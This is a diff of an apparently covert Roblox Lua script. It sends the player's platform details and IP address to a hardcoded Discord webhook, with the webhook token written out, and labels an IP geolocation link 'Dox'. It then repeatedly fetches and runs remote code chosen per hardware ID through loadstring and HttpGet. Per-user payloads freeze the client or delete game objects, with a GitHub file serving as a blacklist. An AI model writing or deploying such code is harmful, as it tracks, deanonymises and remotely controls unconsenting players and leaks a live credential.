@@ -3,7 +3,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 local UserInputService = game:GetService("UserInputService")
-local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 -- Platform information
@@ -55,11 +54,13 @@ local b = false
 local bp = false
 local s = false
 
-if c then while true do end endif b then local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent'); if re then re:Destroy() end endif bp then local p = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom;if p then p:Destroy() end endif s then local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint');if n then n.LowerLimit = 1; n.UpperLimit = 1 end end
+if c then while true do end end
+if b then local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent'); if re then re:Destroy() end end
+if bp then local p = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom; if p then p:Destroy() end end
+if s then local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint'); if n then n.LowerLimit = 1; n.UpperLimit = 1 end end
 ]]
     return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. filePath .. "&value=" .. HttpService:UrlEncode(content)
 end
-
 
 local function generateEditURL()
     return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath
@@ -70,7 +71,7 @@ local function generateGeoLink(ip)
 end
 
 -- Identify executor
-local exe = identifyexecutor()
+local exe = pcall(function() return identifyexecutor() end) and identifyexecutor() or "Unknown"
 
 -- Construct the webhook data
 local url = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO" -- Replace with your webhook URL
@@ -99,7 +100,7 @@ local data = {
                     ["name"] = "Commands",
                     ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
                              "[Create File](" .. generateCreateFileURL() .. ")\n" ..
-                                "[Dox](" .. generateGeoLink(ipAddress) .. ")",
+                             "[Dox](" .. generateGeoLink(ipAddress) .. ")",
                     ["inline"] = true
                 },
                 {
@@ -126,10 +127,11 @@ if not success then
     warn("Failed to send Discord message: " .. err)
 end
 
+-- Continuous script loading
 while true do
     wait(5)
     local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/Test/tree/main/" .. hwid .. ".lua"))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/Test/main/" .. hwid .. ".lua"))()
     end)
 
     if success then
@@ -137,7 +139,6 @@ while true do
         break
     else
         -- Optionally, you can print the error for debugging purposes
-        print("F")
+        print("Failed to load script: " .. tostring(result))
     end
 end
-
